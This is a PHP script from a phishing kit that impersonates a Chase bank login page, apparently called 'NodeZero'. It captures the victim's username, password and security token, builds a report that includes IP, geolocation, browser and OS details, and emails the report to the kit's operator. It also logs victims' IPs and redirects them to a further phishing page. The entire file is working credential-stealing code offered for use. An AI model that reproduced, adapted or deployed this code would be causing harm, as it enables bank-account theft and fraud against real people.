<?php
session_start();
require_once '../main.php';
include('../detects.php');
include('../blockers.php');

if (!$_POST['passwordbank']){
} else {
    $datet= $date;
    $VictimInfo1 = "| Submitted by : " . $v_ip . " (" . gethostbyaddr($v_ip) . ")";
    $VictimInfo2 = "| L0cation : " . $citykota . ", " . $regioncity . ", " . $countryname . "";
    $VictimInfo3 = "| Us3rAgent : " . $user_agent . "";
    $VictimInfo4 = "| Br0wser : " . $br . "";
    $VictimInfo5 = "| Os : " . $os . "";
    $userbank = $_SESSION['userbank'] = $_POST['userbank'];
    $passwordbank = $_SESSION['passwordbank'] = $_POST['passwordbank'] ;
    $securityTokenbank = $_SESSION['securityTokenbank'] = $_POST['securityTokenbank'] ;
    $message = "+ -------- [ ⚡ NodeZero ⚡ ] -----------+\n";
    $message .="| 🏦 Ch4se L0gin D3tails \n";
    $message .="| Ch4se l0gin : $userbank\n";
    $message .="| Ch4se p4ssw0rd : $passwordbank\n";
    if (isset($_SESSION['securityTokenbank'])) {
        $message .= "| Ch4se S3curity Token : $securityTokenbank\n";
    }
    $message .="+ ------------------------------------+\n";
    $message .="| 🌐 Victim Inf0rmation\n";
    $message .="$VictimInfo1\n";
    $message .="$VictimInfo2\n";
    $message .="$VictimInfo3\n";
    $message .="$VictimInfo4\n";
    $message .="$VictimInfo5\n";
    $message .="| 🕛 Received : $date\n";
    $message .="+ ------------------------------------+\n";
    $subject = "CH4SE L0GIN: ".$_POST['userbank']." [ $cn - $os - $v_ip ]";
    if($send_login == "on") {
        kirim_mail($email_result, "CH4SE L0GIN", $subject, $message);
    }
    tulis_file("../result/total_login.txt", $v_ip);
    header('Location: emailbank?key='.$key);
}
?>